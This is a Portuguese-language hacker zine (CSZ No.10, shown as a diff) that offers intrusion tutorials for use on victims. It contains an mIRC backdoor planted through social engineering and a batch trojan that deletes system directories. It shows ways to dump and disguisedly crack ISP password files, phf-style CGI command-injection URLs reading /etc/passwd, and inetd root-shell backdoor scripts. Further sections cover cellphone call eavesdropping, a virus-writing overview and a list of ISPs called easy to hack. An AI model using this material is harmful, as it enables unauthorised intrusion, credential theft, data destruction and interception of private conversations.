@@ -1,0 +1,846 @@
+			CCCCCCCC  SSSSSSSS  ZZZZZZZZ
+			CC	  SS	     ZZ
+			CC	  SS	      ZZ
+			CC	  SSSSSSSS     ZZ
+			CC		SS	ZZ
+			CC		SS	 ZZ
+			CCCCCCCC  SSSSSSSS  ZZZZZZZZ
+
+			   CSZ - Cheat Struck Zine
+				by Cheat Struck
+
+				       No.10
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ Indice $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Seção:	Matéria:		Assunto:		Autor:		Nota:
+1.	Introdução		CSZ 10			Cheat Struck	---
+2.	ICQ Tips		Acabando com lamahs no	^DarkLorD^	9,0
+				mIRC.
+3.	Hacking para iniciantes	Hackear prov de acesso	Cheat Struck	9,5
+4.	Crackerz		Aumentando bytes	Cheat Struck	9,0
+5.	Invasão de privacidade	Hack cgi-bin		Cheat Struck	10,0
+6.	Programação		Scripts para linux	Cheat Struck	8,5
+7.	Phreaking		Telefonia celular	Cheat Struck	10,0
+8.	VIRII			tutorial parte2		Cheat Struck	9,0
+9.	Hack, the Art		Novas backdoor's	Cheat Struck	10,0
+10.	Preview			Matérias para a CSZ11	Cheat Struck	---
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 1. Introdução $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	E ae malucos!!! Estou screvendo essa porra logo depois de sair de um
+chat com uns amigos(Harris, DeMoN, bash e _DarkLorD_). Hoje foi um ótimo dia
+se não fosse por um otário chamado #########. O cara eh o maior saco!!! Ficou
+torrando a minha paciencia soh pq eu tava usando o mIRC(berg :P) para entrar
+no via-rs.
+	Porra vai encher o sako de outro! Eu tava acabando a zine numero 09
+e como eu faço no Ruindows eu não queria reiniciar o computador prar me cone-
+ctar. Esse cara vem sendo um saco toda a vez q eu encontro ele na via-rs.
+	Para evitar panacas como este, eu vou colocar nesta edição uns tróço
+trizinho de IRC que te ajudará pacas a acabar com esses lamers que soh enter-
+rompem o trafico na inet.
+	Bom, mas deixando isso pra lah, eu to com bastante coisa aki pra esse
+numero, e espero que fique afude. Nos esbarramos por aí.
+	PS: Surgiram vários pedidos de pessoas para serem editores, entaum
+aí vai as areas q eu to precisando de ajuda: Anarchy, Virii, Programação,
+Crackerz e Bugz. Para ser um editor, me mande a sua matéria sobre qquer coisa
+relacionada, eu vou avaliar e talvéz(se ficar bom) vou colocar na zine com o
+seu nick e e-mail(se quizer).
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 2. IRC Tips $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Atenção!!! Essa seção não eh permanente e tudo oque vc verá aki foi
+retirado do Imortal Zine e complementado por mim.
+
+	Essas backdoor's são para os q ainda usam mIRC. Ele consiste em alte-
+rar os arquivos .INI do mIRC.
+
+	Vamos começar do inicio...
+
+	[Entrando]
+	A primeira coisa que veremos eh como entrar no computador do cara.
+	Quando você jah estiver conectado a inet, digite:
+
+/dns {nick}
+
+	Onde {nick} eh o nickname do lamah.
+	Pegue o IP dele e scaneie para localizar a porta em que ele estah.
+	Agora telneteie ao sistema dele, colocando o IP dele como host e use
+a porta que ele estava usando. Ex:
+
+telnet 200.200.200.1:115
+
+	Onde 200.200.200.1 é o IP do lamah e 115 a porta.
+	Jah dentro do sys do cara procure pelo file remote1.ini ou apenas
+remote.ini no diretório do mIRC.
+	Adiciona a seguinte linha:
+
+n1=ctcp 1:*: $parm2 *3
+
+	Depois do [script].
+	Se quizer, passe virus prele tb.
+
+	[Engenharia Social]
+	Isso irá depender um pouco da sua labia.
+	Converse com ele e tente ser amizade do cara. Então diga a ele digi-
+tar os seguintes comandos:
+
+/load -rs remote1.ini
+ou
+/load -rs remote.ini
+
+	Dependendo do file q vc editou.
+	e depois diga prele digitar:
+
+/ctcps on
+
+	[Hackeando]
+	Aí você pergunta: Tah mas o que eu posso fazer com essa backdoor ago-
+ra??? A resposta estah nestes comandos que vc pode digitar no seu mIRC mesmo:
+
+/ctcp {nick} fire /notice #Channel Eu sou GAY!
+
+	Manero neh? Isso faiz com que o maneh mande a noticia para o #Channel
+dizendo "Eu sou GAY!". Aki {nick} é o nick do lamah, e #Channel o canal onde
+a noticia serah dada.
+	Outro tróço trii é quando vc invadir o sistema dele deixe um trojam,
+pode ser ateh em .BAT, e ai digite:
+
+/ctcp {nick} fire /run Trojam.BAT
+
+	Onde {nick} é o nickname do lamah e Trojam.BAT o nome do trojam, se
+ele naum estiver no dir do mIRC deverá estar assim:
+
+/ctcp {nick} fire /run C:\local\Trojam.BAT
+
+	Se vc ainda naum entendeu como funciona o esquema, entaum vc eh um
+desses lamers q serão invadidos pelos + espertos.
+
+	[Trojam em .BAT]
+	O exemplo de Trojam que vc pode colocar eh:
+
+-----Corte aki---------------------------------------------------------------
+@echo off
+:win95
+if not exist c:\win95\*.* goto windows
+deltree c:\win95\ /y > nul
+:windows
+if not exist c:\windows\*.* goto dos
+deltree c:\windows\ /y > nul
+:dos
+if not exist c:\dos\*.* goto end
+deltree c:\dos\ /y > nul
+:end
+del C:\command.com
+del c:\autoexec.bat
+del c:\config.sys
+exit
+-----Corte aki---------------------------------------------------------------
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 3. Hacking para iniciantes $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Aki estão alguns comandos e dicas que você pode usar na hora de hacke
+ar provedores de acesso a internet.
+
+==========Pegando contas sem senha===========================================
+
+	Primeiro, o file q tem todas as contas dos users cadastrados não eh o
+/etc/passwd e sim o /etc/yppasswd.
+	Se você eh daqueles que não tem saco para descriptar akele mundarel
+de senhas apenas entaum procure por contas sem senha. Para isso use o cmd:
+
+# cat yppasswd | grep :: >> /seu/dir/senhas.txt
+
+ou
+
+# ypcat passwd | grep :: >> /seu/dir/senhas.txt
+
+	Onde /seu/dir eh o diretório onde o arquivo de senhas deve ser salva-
+do, e senhas.txt é o arquivo com as contas sem senha.
+
+==========Pegando todas as contas do provedor================================
+
+	Mas se você quizer pegar o passwd inteiro digite:
+
+# cat yppasswd >> /seu/dir/senhas.txt
+
+ou
+
+# ypcat passwd >> /seu/dir/senhas.txt
+
+	Repare que no primeiro comando(cat) você precisa l9ocalizar o file
+yppasswd e no segundo naum.
+
+==========Descriptando de uma maneira fácil==================================
+
+	Pq naum deixar o jack ou o john(isso eh tudo nome de progs seu lamer)
+descriptando as senhas em outro computador??
+	Use a sua própria shell para rodar os progs.
+	Assim:
+
+1. Renomeie o progama jack ou john ou qquer outro crackeador para httpd.
+2. Renomeie o file de contas para index.http.
+3. Se precisar de uma wordlist renomeie-a para applet.java.
+
+	Note que eh tudo relacionado a http, soh pra enganar o root do sys.
+
+4. Envie-os para a sua shell.
+5. Rodoe-os assim:
+$ ./httpd -pwfile:index.http -wordfile:applet.java -quiet
+6. Pressione Ctrl+C para deixar o prog.
+7. Digite: nohup ./httpd -restore &
+
+	Prontinho, o prog está sendo rodado e vc poderá sair a vontade q ele
+continuarah rodando, pq o servidor da sua shell estarah 24 horas p/ dia cone-
+ctado. O comando nohup diz para o servidor ignorar a sua saida e continuar
+rodando o programa, e o & rodarah o prog em background.
+	Apareçarah uma msg de erro, ignorea que o john serah inicializado.
+	Após o carregamento do john, aperte <enter> para voltar ao prompt.
+
+==========Outras dicas úteis=================================================
+
+	Aki tem outras dicas que você pode achar útil:
+
+***Para encontrar contas sem senha:
+# cat /etc/passwd | grep ::
+
+***Para encontrar a conta do root:
+# cat /etc/passwd | grep :0:0:
+
+***Para encontrar a conta de algum usuário:
+# cat /etc/passwd | grep Login_do_user
+
+==========¡¡¡Atenção!!!======================================================
+
+	Nunca se logue com a conta original do root, pois sempre que o sys
+estiver ativado, ele estarah usando-a.
+	A matéria "Descriptando de uma maneira fácil" foi tirada da zine Hack
+and Phreak e alterada por mim.
+
+==========Faturando senhas fácil, fácil======================================
+
+	Eu não iria publicar essa matéria aki porque naum tem nada a ver com
+hacking. Mas achei enteresante quando eu começei a falar com os caras do ca-
+nal #senhas. É a maior moleza tu consiguir senhas nesse canal, as vezes tem
+uns cara que soh entram, digitam uma senha e saem, mas caso isso naum aconte-
+ça é só vc ter uma senha que vc poderá multiplica-la por ##x. Claro que você
+naum deve dar a sua senha pro cara neh, naum seja burro porque eles naum pe-
+gam a senha soh pra se exibir, eles usam.
+	Aki tah os provedores + desejados no #senhas:
+
+via-rs
+datacontrol
+uol
+CPOVO
+nutecnet
+conex
+mandic
+e senhas para numeros 0800(ligação de graça).
+
+	Porém se vc tiver uma senha de outros provedores, os cara lah tb ace-
+itam legal. PS: Naum tente trapacea-los que eles testam a senha por telnet e
+se naum funcionar é ban e kick pra ti.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 4. Crackerz $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Vamos crackear um outro programa simples que criaremos, apenas para
+pegar bem o tróço.
+	Aki estah a fonte do programa que crackearemos:
+
+;----------Corte aki---------------------------------------------------------
+n teste.com
+a
+MOV     AH,01
+MOV     CX,0007
+INT     10
+INT     20
+
+rcx
+09
+w
+q
+
+;----------Corte aki---------------------------------------------------------
+
+	Salve a fonte como teste.scr e debugue este programa assim:
+
+debug < teste.scr
+
+	A função dele eh mudar o cursor do teclado. Execute-o pelo dos e veja
+a diferença.
+	Agora, vejamos o que podemos fazer com esse programa.
+	Rode um editor hexadecimal nesse programa e veja como ele irah apare-
+cer. Exatamente isso:
+
+	B4 01 B9 07 00 CD 10 CD 20
+
+	Onde:
+
+	B4 01		=	 MOV AH,01
+	B9 07 00	=	 MOV CX, 0007
+	CD 10		=	 INT 10
+	CD 20		=	 INT 20
+
+	Agora que tal nós colocarmos um monte de besteiras apenas para aumen-
+tar o tamanho do arquivo. Façamos o seguinte:
+	Nos adicionaremos o comando jmp 0180, e no 0180 colocaremos nop.
+	Isso aumentará o arquivo de 9 bytes para 129 bytes.
+	Como fazer isso usando o editor hexadecimal???
+	Entre no debug novamente e digte:
+
+-a 0109
+
+	Para começar editar do local onde vc havia acabado. Então coloque o
+comando jmp 0180. Agora de enter para voltar pro prompt e digite:
+
+-a 0180
+
+	Para editar o local indicado no comando jmp. Alí coloque nop e pronto
+o programa está prontinho.
+	Se você quizer fazer isso com algum outro programa veja o numero de
+bytes que ele tem. Ex: 940 bytes. Abra a calculadora cientifica do Windows e
+digite o numero de bytes lah, agora mude a opção DEC para HEX. O numero hexa
+apareceu, no caso seria 3AC. Agora adicione +100 e veja o numero(4AC).
+	Pronto! Vc tem o local onde o comando acabou. Digite no prompt do
+Debug "a 04AC", sendo que o 04AC aki eh o nosso exemplo.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 5. Invasão de privacidade $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Bah! Tem tanta coisa para colocar aki e no Hack, the Art que eu tenho
+que criar ateh uma seção nova.
+	Para esta edição eu tava na duvida de que matéria colocaria, a do CGI
+ou a de hackear bibliotecas de telnet tipo a ufrgs e pucrs. Então eu tirei um
+cara/coroa e deu cara. Por isso aproveitem a matéria de invasão por CGI.
+	Os dados aki vc tb pode encontrar no Manual Definido de Invasão - CSM
+escrito por mim mesmo.
+
+	O que é CGI??
+	Muitos beginners sabem pra que que serve mas não sabem o que é.
+	CGI ( Common Gateway Interface ) é resumidamente uma ligação entre o
+programa do servidor e o usuário. Sabe aquelas procuras por palavras que você
+faz em sites tipo "www.cade.com.br".
+       O que? Você nem sabia que isso existia? Então de uma passada no "cade"
+e pesquise por qualquer palavra(mesmo que não exista). Depois que a pesquisa
+tiver sido encerrada e os resultados exibidos, veja o campo do endereço do
+seu BROWSER, estará algo como:
+
+ http://www.cade.com/cgi-bin/phf?Qalias="hackers";\touch20%/tmp/bla
+
+	Bem... Agora que você sabe o que é cgi vamos ao que enteressa:
+	Existem algumas maneiras de burlar o cgi. Aqui vão algumas delas que
+tem como objetivo pegar o /etc/passwd.
+
+*** Phf ***
+http://www.<provedor>.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+*** Php ***
+http://www.<provedor>.com/cgi-bin/php.cgi?%0a/bin/cat%20/etc/passwd
+
+*** Query ***
+http://www.<provedor>.com/cgi-bin/query?%0a/bin/cat%20/etc/passwd
+
+*** Test CGI ***
+http://www.<provedor>.com/cgi-bin/test-cgi?%0A/bin/cat%20/etc/passwd
+
+*** Echo ***
+http://www.<provedor>.com/cgi-bin/echo?%0Acat%20/etc/passwd
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 6. Programação $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Bem... O tutorial de Pascal tah saindo, por enquanto aproveitem a ma-
+téria que ensina a fazer scripts para UNIX.
+
+	Scripts no Linux são a mesma coisa que .BAT's no MS-DOS/Win. Eles su-
+portam qquer comando do linux tipo "cp, mv, cd, pwa" e tb possuem alguns cmds
+especiais tipo "echo, read, trap, exit, case, loops, test, expr".
+	Nesta matéria veremos apenas os comandos especiais de scripts.
+	Os textos que contem um # na frente são explicativos.
+
+----------Fazendo Scripts----------------------------------------------------
+
+#Comandos especiais para scripts de linux
+
+##### Comando echo #####
+
+	Mostra algum texto na tela. Ex:
+
+echo "hello world"			#Mostrará apenas hello world(sem ""s)
+
+	Também pode ser usado para adicionar um texto a um arquivo. Ex:
+
+echo "hello world" >> file.test		#Adicionará o texto hello world no
+					 arquivo file.test
+
+##### Comando read #####
+
+	Lê algo para uma variavel. Ex:
+
+echo "Digite o seu nome:"		#Mostra Digite o seu nome:
+read myname				#Coloca o que for digitado na varia-
+					 vel myname.
+echo "Ola" myname			#Mostra Ola + o conteudo do myname
+
+##### Comando trap #####
+
+	Espera alguem teclar Ctrl + C para executar os comandos. Ex:
+
+trap "echo você teclou Ctrl+C"		#Ao teclar ctrl+C mostra o txt.
+
+trap "echo 'Hello' ; echo 'World'"	#Ao teclar ctrl+c mostra o txt assim:
+					 Hello
+					 World
+
+##### Função case #####
+
+	Faz um menu de opções. Ex:
+
+echo "Escolha:"				#Mostra o txt
+echo "(D)iretorio (L)ogoff (S)hell"
+read choice				#Coloca o caracter pressionado na
+					 variavel choice
+case $choice in				#Caso o choice seja...
+
+D) echo "Listando Diretorios...";	#...D então execute estes cmds
+   ls -al ;;
+
+L) echo Bye;				#...L então execute estes cmds
+   kill -1 0;;
+
+S) exit;;				#...S então execute estes cmds
+
+*) Echo "Erro! Nao e um comando";;	#...Qualquer outro então mostra isso
+
+esac					#finaliza o comando case
+
+##### Comando repeat #####
+
+	Faz uma lista das palavrasa. Ex:
+
+repeat teste1 teste2 teste3
+#Isso mostrará uma lista assim: teste1
+				teste2
+				teste3
+
+##### Comando for #####
+
+	Tem a mesma função do repeat porém os subcmds são + chatos.
+
+##### Comando test #####
+
+	A sintaxe do test é:
+
+test variavel opção variavel
+
+	As opções são as seguintes:
+-eq    				#igual(=)
+-ne				#diferente (<>)
+-gt    				#maior (>)
+-lt				#menor (<)
+-ge    				#maior ou igual (>=)
+-le    				#menor ou igual (<=)
+
+	Exemplos:
+
+test 3 -eq 3			#Mostrará um 0 pois são iguais
+
+##### Comando expr #####
+
+	Faz operações numericas.
+	O formato é:
+
+expr numero1 operador numero2
+
+	Os operadores são:
++ mais
+- menos
+* multiplicação
+/ divisão
+^ exponenciação
+
+	Exemplo:
+
+var = expr 4 + 4		#var igual a 8
+
+	¡Atenção! 4+4 é diferente de 4 + 4.
+
+var = expr 4+4			#var igual a 4+4 e não igual a 8
+
+##### Variaveis #####
+
+HOME = Diretório home
+PS1 = Prompt que vc quer
+PATH = Caminho dos programas executaveis. Ex:
+
+PATH="/bin"			#Os programas executaveis serão procurados
+				 apenas no diretório /bin
+TERM = Controle do terminal
+
+----------Fim----------------------------------------------------------------
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 7. Phreaking $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Últimos comandos para programar cellulares motorola via TESTMODE.
+
+----------Ultima parte das funções do TESTMODE (p.6)-------------------------
+56#  Diagnostico de iluminação.
+
+57x# Chama um modo de Processo
+		   x=0, AMPS
+		   x=1, NAMPS
+		   x=2-4, RESERVADO
+		   x=5, sinalização TDMA
+		   x=6, sinalização TDMA com loopback antes da decodificação
+		   x=7, sinalização TDMA com loopback voice depois da decod.
+		   x=8, sinalização TDMA com loopback FACCH depois da decod.
+		   x=9, sincronização forçada do TDMA
+
+58#  Compander On (compressor e expandidor do Audio)
+
+59#  Compander Off (compressor e expandidor do Audio)
+
+60#  nenhuma funcão
+
+61#  Transferidor ESN
+
+62#  liga o Ringer Audio Path
+
+63#  desliga o Ringer Audio Path
+
+64#  Desconhecida
+
+65#  Desconhecida
+
+66#  Identifica o Transferidor de ESN e NAM. Veja comando 80#.
+
+67#  Desconhecida
+
+68#  Mostra informação sobre o FLEX e o Modelo
+
+69#  Usado com 66# para Identificar o Transferidor.
+
+70#  Abrevia o transmissor de audio com FCC ID ABZ89FT5668.
+
+71#  Abrevia o ajustamento de força com FCC ID ABZ89FT5668.
+
+72#  Mostra a face do transmissor de audio.
+
+73#  Mostra a face do ajustamento de força.
+
+74#  Desconhecido
+
+75#  Desconhecido
+
+76#  Desconhecido
+
+77#  Desconhecido
+
+78#  Desconhecido
+
+79#  Desconhecido
+
+80*# Identificação corrente do Transferidor. Isso não é o transferidor do ESN
+
+		   *=0, informação sobre os transferidores NAM
+		   *=1, nomes & numeros de telephonena memória
+		   *=2, Transferidores C-Scan SID's
+
+----------Fim----------------------------------------------------------------
+
+	Corrigindo o erro editado na primeira parte desses comandos, não são
+99 comandos e sim 80.
+	Agora que acabamos de ver os comandos do TESTMODE vamos phreakear com
+ele, que a meu respeito é uma das maneiras mais tri de se phreakear.
+
+***** Tomando controle de Canais *****
+
+	Cada conversa telefonica é feita em canais. As conversas de telefones
+com linha tb usam canais, porém vc não pode controla-los pois é transmitido
+através de um fio telefonico em quanto as de cellulares são transmitidas por
+ondas.
+	Veja o desenho:
+
+				+-----------+
+				|	    |.'^'._.'^'._.'^'._.'^'._'^'o
+	 o.'^'._.'^'._.'^'._.'^'|  Central  |				|
+	 |			|	    |				|
+	 |			+-----------+				|
+	 |							 +-------+
+	+-------+						 | ===== |
+	| ===== |						 |	 |
+	|	|						 | 1 2 3 |
+	| 1 2 3 |						 | 4 5 6 |
+	| 4 5 6 |						 | 7 8 9 |
+	| 7 8 9 |						 | * 0 # |
+	| * 0 # |						 |	 |
+	|	|						 +-------+
+	+-------+						 Celular2
+	Celular1
+
+	O celular1 e o celular2 se interligam atravéz de um canal. Se este
+canal não existisse o que aconteceria seria o seguinte:
+
+	+-----------+					+----------+
+	|	    |.'^'._.'^'._.'^'._.'^'._'^'._.'^'._| celular1 |
+	|  Central  |					+----------+
+	|	    |
+	+-----------+'^'.
+	 (	   (	 '._.'^'.
+	  )         '.		 '._.'^'. +----------+
+	 (	      )			 '| celular4 |
+	  )	     (			  +----------+
+	 (	      '.
+      +----------+    +----------+
+      | celular2 |    | celular3 |
+      +----------+    +----------+
+
+	Isso geraria a famosa "linha cruzada". Então cada conversa tem o seu
+canal, ou seja: o celular1 e o celular2 tem o seu e o celular3 e 4 o seu, pra
+não gerar a "linha cruzada". A "linha cruzada" é gerada sempre que + de dois
+telephones usam o mesmo canal.
+	Vamos então phreakear a conversa telefonica feita em qquer canal.
+	Primeiro nos devemos descobrir o canal que eles estão, utilizando um
+scaneador de canais. O scaneador padrão é o 36#. Então digite:
+
+3610000#
+
+	Isso exibirá todos os canais acessados de 10 em 10 segundos. Quando
+vc achar um canal digite * para parar de mostrar e # para sair.
+	Agora você deve ligar o Receptor de Audio(RX). Para isso digite:
+
+10#
+
+	Agora é só vc mudar o seu canal atual para o que vc detectou com o
+scaneador. Para isso digite:
+
+11****#
+
+	Onde o **** é o canal.
+	Pronto! Você se meteu no meio do canal onde os dois carinhas conver-
+savam. Assim que nem o desenho:
+
+				  +-----------+
+				  |	      |
+	 o_.'^'._.'^'._.'^'._.'^'.|  Central  |.'^'._.'^'._.'^'._.'^'._.o
+	 |			  |	      |				|
+	 |			  +-----------+			 	|
+ 	 |				(			 	|
+	+-------+			 )			 +-------+
+	| ===== |			(			 | ===== |
+	|	|			 )			 |	 |
+	| 1 2 3 |		   +----------+			 | 1 2 3 |
+	| 4 5 6 |		   |   você   |			 | 4 5 6 |
+	| 7 8 9 |		   +----------+			 | 7 8 9 |
+	| * 0 # |						 | * 0 # |
+	|	|						 |	 |
+	+-------+						 +-------+
+	celular1						 celular2
+
+	Você mandou um sinal para a central dizendo que está conversando com
+alguem utilizando o mesmo canal que o celular1 e o celular2.
+	Agora você pode ouvi-los porém eles naum podem te ouvir.
+
+	Na próxima edição veremos o q nós podemos fazer no canal e tb apren-
+der uns outros truques de phreaking.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 8. VIRII $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+----------Manual-de-Criação-de-Virus-by-Cheat-Struck-(parte2)----------------
+
+[[[[[ Encryptação ]]]]]
+
+	É um passo muito importante do virus, exencial para q não seja desco-
+berto. Como isso é algo muito complexo, deixarei para explicar em alguma ed-
+ição futura.
+
+[[[[[ Função ]]]]]
+
+	É resumidamente o que o virus irá fazer com o sistema do usuario in-
+fectado. Pode conter alguma data para a sua ativação, o que é bem comum. Aki
+estão algumas coisas que o virus poderá fazer:
+
+1. Deixar o sistema mais lento.
+2. Deleção de arquivos.
+3. Mostrar messagens
+4. Apagar/Trocar as tabelas de partição/Setor de Boot/FAT do disco rígido
+
+[[[[[ Virus Residentes ]]]]]
+
+	Os virus residentes são akeles que se gravam na memória. Para isso
+ele segue os seguintes passos:
+
+1. Encontrar o tamanho da memória
+2. Encolher a memória do programa para o total de memoria (tamanho do virus)
+3. Alocar memoria para o virus (esse ira ser na área de memoria alta)
+4. Mudar o MCB do programa para o fim da corrente
+5. Copiar o virus para a memória alta
+6. Salve os vetores de interrupção antigo se o virus deseja acorentar vetores
+7. Mudar os vetores de interrupção para a localização apropriada na memória
+   alta .
+
+	Eles tem como privilégio: o tamanho, que na maioria das vezes é menor
+do que os runtimes; a efetividade, são mais virulentos do que os runtimes; a
+velocidade; e a camuflagem que sempre é indispensavél.
+
+	Os virus runtimes são akeles que apenas infectam e depois se deletam
+do hard disk.
+
+----------Fim----------------------------------------------------------------
+
+	Tah, é isso?? E cade as fontes e os comandos que eu tenho que botar??
+	Se vc fez essa pergunta vc não é um hacker, vc é uma lamah no meio da
+internet onde escorregou Bill Gates. Você pode não ter aprendido muito com o
+tutorial de Assembly(publicado nas edições passadas) mas quem mandou você es-
+tudar hack apenas por essa zine. Vah procura uns tutoriais de assembly na net
+que tenham akelas poucas 30 - 40 paginas, porque eu não vou gastar + edições
+da zine para publicar todos os segredos da linguagem.
+	Na próxima edição vamos estudar os virus em pascal junto com a lingu-
+agem na programação. O compilador de pascal é TPC.EXE(jah vá arranjando-o).
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 9. Hack, the Art $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Vamos ver mais alguns exemplos de backdoor's.
+
+***** Adicionando serviços *****
+
+	Vamos adicionar um serviço pela porta 1111.
+	Edite o arquivo /etc/services e adicione a seguinte linha:
+
+cnn     1111/tcp        cnn
+
+        Edite o arquivo /etc/inetd.conf e adicione esta linha:
+
+cnn   stream tcp nowait root /bin/sh sh -i
+
+	Agora edite o /etc/hosts.deny e delete a linha all:all
+
+	PAra facilitar a sua vida aki tem um script que fará esse trabalho
+'sujo' para você.
+
+----------backdoor.c---------------------------------------------------------
+
+echo "cnn    1111/tcp    cnn" >> /etc/services
+echo "cnn   stream tcp nowait root /bin/sh sh -i" >> /etc/inetd.conf
+rm /etc/hosts.deny
+echo "" >> /etc/hosts.deny
+
+-----------------------------------------------------------------------------
+
+***** Fazendo novas backdoors *****
+
+	Vc pode fazer várias outras backdoor's usando os procedimentos acima,
+tipo: Uma vez coloquei uma backdoor no telnet do sistema do lamer aí qquer
+um que loga-se por telnet teria nível de root.
+	Para fazer isso apenas edite o /etc/inetd.conf e procure a linha :
+
+telnet  stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/in.telnetd
+
+	E substitua por :
+
+telnet  stream  tcp     nowait  root    /bin/sh  /bin/sh -i
+
+	Edite também o /etc/hosts.allow e acressente a linha:
+
+all:all
+
+	E pronto a backdoor está feita. Porém essa backdoor é muito fácil de
+ser encontrada por usuarios de experiencia média. Serve apenas para sistemas
+de lamers.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 10. Preview $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Materias para a CSZ numero 11(se sair).
+
+* Phreaking			'Novos truques para celulares
+* Programação			'Tutorial de pascal
+* VIRII				'Virus em pascal
+* Invasão de privacidade	'Invadindo por ICQ
+* Hack, the Art			'Como hackear bibliotecas por telnet
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ ¡BONUS! $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	-=-=-=TOP10=-=-=-
+	Os melhores materiais hacks brasileiros, encontrados na inet.
+
+1. Zine Axur05
+2. Zine Hack n' Phreak
+3. Mask's HomePage v.II ( www.geocities.com/SiliconValley/Lab/2250 )
+4. Hack n' Phreak HomePage ( www.geocities.com/SiliconValley/Peaks/1292 )
+5. Zine Near(z)
+6. BlackMask home page( www.blackmask.base.org )
+7. Zine UHF
+8. UHF Home page ( www.uhf.base.org )
+9. Zine RWX
+10. Zine Quebra de Sigilo
+
+	-=-=-=FTP de provedores=-=-=-
+	Url's de provedores do RS quase todos saum de poa e fáceis de hackear
+
+qbserver.qbnet.com.br		(qbnet)
+emrede.com.br			(emrede)
+rubi.netmarket.com.br		(netmarket)
+tca-nt.com.br			(tca internet provider)
